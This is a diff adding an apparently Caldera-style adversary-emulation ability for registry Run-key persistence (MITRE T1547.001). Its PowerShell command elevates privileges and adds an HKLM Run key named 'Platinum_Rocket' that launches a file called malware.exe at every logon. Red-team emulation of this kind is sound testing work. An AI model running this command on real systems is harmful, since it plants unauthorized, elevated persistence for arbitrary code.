@@ -1,0 +1,41 @@
+- name: Registry Run Keys w/ Rocket
+  access: {}
+  requirements: []
+  repeatable: false
+  tactic: persistence
+  plugin: ''
+  description: Establish persistence adding a registry run key named Rocket Platinum
+    which executes malware.exe everytime user logon
+  singleton: false
+  executors:
+  - name: psh
+    code: null
+    parsers: []
+    timeout: 60
+    cleanup: []
+    uploads: []
+    language: null
+    platform: windows
+    payloads: []
+    build_target: null
+    command: '$regCommand = "C:\Windows\System32\reg.exe";
+
+      $valueName = "Platinum_Rocket";
+
+      $data = "$HOME\Desktop\malware.exe";
+
+      $arguments = "ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v `"$valueName`"
+      /t REG_SZ /d `"$data`" /f";
+
+      Start-Process -FilePath $regCommand -ArgumentList $arguments -Verb RunAs'
+    variations: []
+    additional_info: {}
+  privilege: ''
+  technique_name: 'Boot or Logon Autostart Execution: Registry Run Keys / Startup
+    Folder'
+  delete_payload: true
+  technique_id: T1547.001
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  id: 9c7ba6a0-ccec-41c9-a8e1-53ad0a392c9e
